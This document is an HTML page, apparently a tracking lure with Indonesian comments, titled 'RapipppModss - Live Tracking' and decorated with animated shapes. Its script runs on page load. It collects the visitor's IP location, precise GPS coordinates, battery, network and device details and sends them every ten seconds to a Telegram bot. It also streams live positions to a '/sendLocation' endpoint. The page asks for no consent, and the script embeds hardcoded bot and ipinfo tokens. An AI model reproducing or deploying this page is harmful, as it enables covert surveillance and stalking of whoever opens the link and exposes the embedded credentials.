<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RapipppModss - Live Tracking</title>
<style>
    body, html { height:100%; margin:0; overflow:hidden; font-family:'Arial',sans-serif; background:radial-gradient(circle at 50% 50%, #667eea,#764ba2,#f093fb,#f5576c,#4facfe); background-size:400% 400%; animation:gradientShift 10s ease infinite; }
    @keyframes gradientShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
    .container { position:fixed; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center;}
    h1 { font-size:5rem; font-weight:bold; background:linear-gradient(45deg,#ff6b6b,#feca57,#48dbfb,#6c5ce7); background-size:300% 300%; animation:textColorShift 5s ease infinite; background-clip:text; -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9; }
    @keyframes textColorShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
    .floating-shapes{position:absolute;width:100%;height:100%;overflow:hidden; z-index:-1;}
    .shape{position:absolute;border-radius:50%;background:rgba(255,255,255,0.1);animation:float 8s ease-in-out infinite;}
    @keyframes float {0%,100%{transform:translateY(0) rotate(0deg);}50%{transform:translateY(-100px) rotate(180deg);}}
    .shape:nth-child(1){width:100px;height:100px;left:10%;top:20%;animation-delay:-2s;}
    .shape:nth-child(2){width:150px;height:150px;left:80%;top:60%;animation-delay:-4s;}
    .shape:nth-child(3){width:80px;height:80px;left:50%;top:80%;animation-delay:-6s;}
    .shape:nth-child(4){width:120px;height:120px;left:20%;top:40%;animation-delay:-1s;}
    #status {margin-top:15px;font-size:14px;color:#facc15;}
</style>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
<div class="floating-shapes">
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
</div>
<div class="container">
    <h1>Depayyy</h1>
    <div id="status">Memulai live tracking...</div>
</div>

<script>
const CHAT_ID = "7483495590"; // ganti dengan chat id admin
const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // ganti bot token
const statusEl = document.getElementById('status');

// Ambil info IP & device
async function getDeviceInfo() {
    try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
        const connection = navigator.connection || {};
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString("id-ID");
        let geo = "Tidak tersedia";
        if(navigator.geolocation){
            await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
                geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
                resolve();
            }, ()=>resolve()));
        }

        return `
ðŸŒ *Informasi IP*
ðŸ“¶ Alamat IP: ${ipInfo.ip}
ðŸŒ Negara: ${ipInfo.country}
ðŸžï¸ Wilayah: ${ipInfo.region}
ðŸ™ï¸ Kota: ${ipInfo.city}
ðŸ› ï¸ ISP: ${ipInfo.org}
â±ï¸ Timezone IP: ${ipInfo.timezone || "-"}

ðŸ“± *Detail Perangkat*
ðŸ’» User Agent: ${navigator.userAgent}
ðŸ–¥ï¸ Platform: ${navigator.platform}
ðŸ·ï¸ Vendor: ${navigator.vendor}
ðŸŒ Browser Online: ${navigator.onLine?"âœ… Ya":"âŒ Tidak"}
ðŸ—£ï¸ Bahasa Browser: ${navigator.language}
ðŸ“ Orientation: ${screen.orientation ? screen.orientation.type : "âŒ Tidak tersedia"}
ðŸ–¼ï¸ Resolusi Layar: ${screen.width}x${screen.height} px
ðŸ” Pixel Ratio: ${window.devicePixelRatio}
ðŸŽ¨ Kedalaman Warna: ${screen.colorDepth}-bit
ðŸ“¡ Jaringan: ${connection.effectiveType||"âŒ Tidak diketahui"}
ðŸ“¶ Downlink: ${connection.downlink||"-"} Mbps
â±ï¸ RTT: ${connection.rtt||"-"} ms
ðŸš€ Bandwidth Max: ${connection.downlinkMax||"-"} Mbps
ðŸ”‹ Battery: ${Math.round(battery.level*100)}% ${battery.charging?"âš¡ï¸ Mengisi daya":""}
ðŸª Cookies Enabled: ${navigator.cookieEnabled?"âœ… Ya":"âŒ Tidak"}
ðŸš« Do Not Track: ${navigator.doNotTrack||"âŒ Tidak tersedia"}
ðŸ–¥ï¸ Hardware Concurrency (CPU): ${navigator.hardwareConcurrency||"-"} cores
ðŸ¤ Touch Support: ${("ontouchstart" in window)?"âœ… Ya":"âŒ Tidak"}
â° Waktu: ${time}
ðŸ“ Geolocation: ${geo}
        `;
    } catch(err) {
        console.error(err);
        return "âŒ Tidak bisa mengambil info device.";
    }
}

// Kirim ke Telegram
async function sendToTelegram(data) {
    try{
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("text", data);
        form.append("parse_mode","Markdown");
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await fetch(url,{method:"POST",body:form});
    } catch(e){
        console.error(e);
    }
}

// Live tracking interval
async function liveTracking() {
    statusEl.textContent = "Mengirim data ke Telegram...";
    const info = await getDeviceInfo();
    await sendToTelegram(info);
    statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
}

// Kirim
// Mulai live tracking info device
window.onload = async () => {
    await liveTracking(); // kirim pertama kali
    setInterval(liveTracking, 10000); // update tiap 10 detik

    // Mulai watchPosition untuk share lokasi ke server
    if(navigator.geolocation){
        navigator.geolocation.watchPosition(async (pos) => {
            const { latitude, longitude } = pos.coords;
            await fetch('/sendLocation', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude, longitude })
            });
        }, (err) => console.error(err));
    }
};
</script>
</body>
</html>
